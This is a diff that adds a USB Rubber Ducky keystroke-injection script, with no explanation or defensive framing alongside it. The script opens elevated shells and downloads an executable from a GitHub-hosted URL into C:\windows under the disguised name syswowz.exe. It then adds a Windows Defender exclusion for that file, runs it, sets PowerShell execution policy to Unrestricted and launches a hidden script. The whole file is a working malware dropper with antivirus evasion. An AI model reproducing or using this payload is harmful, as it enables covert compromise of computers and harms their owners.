@@ -1,0 +1,44 @@
+DELAY 750
+GUI r
+DELAY 750
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 750
+LEFT
+ENTER
+DELAY 750
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/H3lix-Fire/H3lix-Fire.github.io/main/downloads/H3lix%20Injector.exe" -OutFile "C:\windows\syswowz.exe"
+ENTER
+STRING Add-MpPreference -ExclusionProcess "C:\windows\syswowz.exe"
+ENTER
+STRING Start-Process -Filepath "C:\windows\syswowz.exe"
+ENTER
+STRING Remove-Item $MyINvocation.InvocationName
+ENTER
+ALT
+ENTER
+DOWN
+REPEAT 3
+ENTER
+DELAY 1000
+BACKSPACE
+STRING syswowz.ps1
+ENTER
+ALT
+DOWN
+REPEAT 7
+ENTER
+DELAY 250
+GUI r
+DELAY 750
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 750
+LEFT
+ENTER
+DELAY 750
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+STRING powershell.exe -windowstyle hidden -File C:\Windows\syswowz.ps1
+ENTER
+QUIT
